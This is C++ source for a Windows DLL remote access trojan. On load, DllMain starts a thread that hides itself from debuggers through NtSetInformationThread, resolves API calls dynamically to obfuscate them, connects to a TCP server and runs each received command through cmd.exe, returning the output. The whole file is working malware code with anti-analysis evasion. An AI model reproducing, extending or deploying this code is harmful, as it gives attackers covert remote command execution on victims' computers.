#include <iostream>
#include <string>
#include "TCPClient.h"
#include "utils.h"
#include "winapi_function_signatures.h"
#include "winapi_obfuscation.h"

#define HideThreadFromDebugger 0x11

DWORD WINAPI StartRAT(LPVOID lpParam)
{
	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>("GetCurrentThread");
	resolve_dynamically<NtSetInformationThread_t>("NtSetInformationThread", NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);

	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
	conn->start_connection();

	while (true)
	{
		// recv command from server
		std::string commandLine = "cmd.exe /C ";
		commandLine.append(conn->recv_data());
		std::string result = exec(commandLine);

		// send result back to server
		conn->send_data(result);
	}
	delete conn;

	return 0;
}


BOOL WINAPI DllMain(HINSTANCE dllHandle, DWORD reason_for_call, LPVOID lpvReserved)
{
	switch (reason_for_call) {
	case DLL_PROCESS_ATTACH:
		// TODO: RESOLVE FUNCTION ADDRESSES DYNAMICALLY
		DisableThreadLibraryCalls(dllHandle);  // Avoid repeated DllMain calls for threads 
		CreateThread(nullptr, 0, StartRAT, nullptr, 0, nullptr); // Create a separate thread to run after DllMain, to avoid deadlocks
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
